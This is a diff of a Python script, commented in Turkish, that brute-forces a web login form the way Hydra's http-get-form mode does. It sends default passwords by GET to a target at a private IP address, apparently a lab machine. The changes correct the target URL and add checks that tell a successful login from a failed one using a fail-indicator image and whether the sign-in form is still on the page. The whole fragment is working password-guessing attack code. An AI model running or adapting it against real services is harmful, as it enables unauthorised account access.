@@ -22,7 +22,7 @@ DEFAULT_PASSWORDS = [
 
 # Target URL (IP'yi değiştirmeniz gerekebilir)
 TARGET_IP = "192.168.75.128"
-TARGET_BASE_URL = f"http://{TARGET_IP}/index.php/signin"
+TARGET_BASE_URL = f"http://{TARGET_IP}/index.php"
 
 # Yanıtta bu varsa → yanlış giriş (Hydra'daki F= parametresi)
 FAIL_INDICATOR = "images/WrongAnswer.gif"
@@ -50,6 +50,7 @@ def try_login(username, password):
     """
     Hydra http-get-form mantığı:
     /index.php:page=signin&username=^USER^&password=^PASS^&Login=Login
+    F=images/WrongAnswer.gif → Bu string response'ta varsa başarısız
     """
     # GET isteği ile query parametreleri URL'de
     params = {
@@ -61,11 +62,29 @@ def try_login(username, password):
     
     try:
         # GET request (Hydra http-get-form gibi)
-        response = requests.get(TARGET_BASE_URL, params=params, timeout=10)
+        response = requests.get(TARGET_BASE_URL, params=params, timeout=10, allow_redirects=True)
         text = response.text
         
-        # Eğer fail indicator yoksa → giriş başarılı
-        return FAIL_INDICATOR not in text
+        # Hydra F= parametresi: Eğer FAIL_INDICATOR response'ta varsa → BAŞARISIZ
+        # Eğer yoksa → BAŞARILI (ama dikkatli olalım)
+        has_fail_indicator = FAIL_INDICATOR in text
+        
+        # Başarılı giriş = fail indicator YOK
+        # Ama ek kontrol: Eğer fail indicator yoksa VE response'ta hala signin formu varsa,
+        # muhtemelen başka bir hata var (örneğin boş şifre hatası)
+        if not has_fail_indicator:
+            # Başarılı girişte genellikle signin sayfasından çıkılır
+            # Eğer hala signin sayfasındaysak ve fail indicator yoksa,
+            # muhtemelen başka bir sorun var, başarısız sayalım
+            if "signin" in text.lower() and "username" in text.lower() and "password" in text.lower():
+                # Hala signin formu var, muhtemelen başarısız
+                return False
+            # Fail indicator yok ve signin sayfasında değiliz → başarılı
+            return True
+        else:
+            # Fail indicator var → başarısız
+            return False
+            
     except requests.exceptions.RequestException as e:
         print(f"⚠️  İstek hatası: {e}")
         return False
